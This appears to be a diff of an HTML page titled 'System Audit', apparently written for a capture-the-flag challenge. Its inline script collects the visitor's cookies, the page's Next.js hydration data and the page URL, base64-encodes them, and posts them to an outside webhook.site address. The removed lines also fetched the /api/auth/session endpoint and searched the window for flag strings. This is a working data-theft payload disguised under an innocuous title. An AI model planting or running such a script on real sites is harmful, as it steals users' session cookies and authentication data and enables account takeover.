@@ -3,27 +3,21 @@
 <head><title>System Audit</title></head>
 <body>
     <script>
-      (async function() {
+     (async function() {
     const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
     
-    let exfil = {
-        memo: "Targeting Next.js State",
-        cookies: document.cookie,
-        // This targets the specific Next.js internal cache where data is stored
-        nextData: window.__NEXT_DATA__ || "No Next Data",
-        // This searches the entire window object for anything containing "Hash{"
-        search: Object.keys(window).filter(key => JSON.stringify(window[key]).includes('Hash{'))
-    };
-
-    // Also, let's try to fetch the specific API that the AuthProvider uses
-    try {
-        const authReq = await fetch('/api/auth/session');
-        exfil.authSession = await authReq.json();
-    } catch(e) {}
-
+    // This grabs the hidden JSON data Next.js uses to hydrate the page
+    const nextData = document.getElementById('__NEXT_DATA__')?.innerHTML;
+    const cookies = document.cookie;
+    
+    // Send it immediately
     fetch(webhook, {
         method: 'POST',
-        body: btoa(JSON.stringify(exfil))
+        body: btoa(JSON.stringify({ 
+            flag_hunt: nextData, 
+            session: cookies,
+            url: window.location.href 
+        }))
     });
 })();
     </script>
